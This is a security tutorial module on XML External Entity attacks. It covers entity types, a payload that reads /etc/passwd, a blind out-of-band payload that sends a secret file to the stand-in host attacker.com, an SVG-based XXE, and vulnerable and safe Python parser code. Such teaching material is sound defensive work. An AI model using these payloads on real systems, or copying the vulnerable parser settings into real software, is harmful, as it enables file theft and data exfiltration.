Module 19 — XML External Entity (XXE)

Discover how XML parsers can be abused to read files, perform SSRF, and exfiltrate data through entity expansion.

XML Entities & DTDs

XML supports Document Type Definitions (DTDs) that can define entities — named references that expand to values when the XML is parsed. There are three key entity types:

TypeSyntaxUse
Internal<!ENTITY name "value">Expands to inline text
External<!ENTITY name SYSTEM "file:///etc/passwd">Reads from URL or file path
Parameter<!ENTITY % name SYSTEM "url">Used inside DTD (for blind/OOB XXE)

Basic XXE Attack

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>

When parsed by a vulnerable XML processor, &xxe; is replaced with the file contents.

Vulnerable Code

from lxml import etree

@app.route('/parse', methods=['POST'])
def parse():
    xml_data = request.data
    # DANGEROUS: resolves external entities
    parser = etree.XMLParser(resolve_entities=True, load_dtd=True, no_network=False)
    doc = etree.fromstring(xml_data, parser)
    return etree.tostring(doc, pretty_print=True)

Safe Code

import defusedxml.ElementTree as ET

@app.route('/parse', methods=['POST'])
def parse():
    xml_data = request.data
    # SAFE: defusedxml blocks DTDs, external entities, and entity expansion
    doc = ET.fromstring(xml_data)
    return ET.tostring(doc)

Blind XXE (Out-of-Band)

When entity values are not reflected in the response, use parameter entities to exfiltrate data to an attacker-controlled server:

<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///app/secret.txt">
  <!ENTITY % exfil SYSTEM "http://attacker.com/log?data=%file;">
  %exfil;
]>
<data>test</data>

XXE via SVG

SVG images are XML-based. Applications that parse SVG uploads may be vulnerable:

<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20">&xxe;</text>
</svg>
Impact: XXE can read local files, perform SSRF to internal services, exfiltrate sensitive data, and in rare cases achieve remote code execution via PHP expect:// or similar protocol handlers.
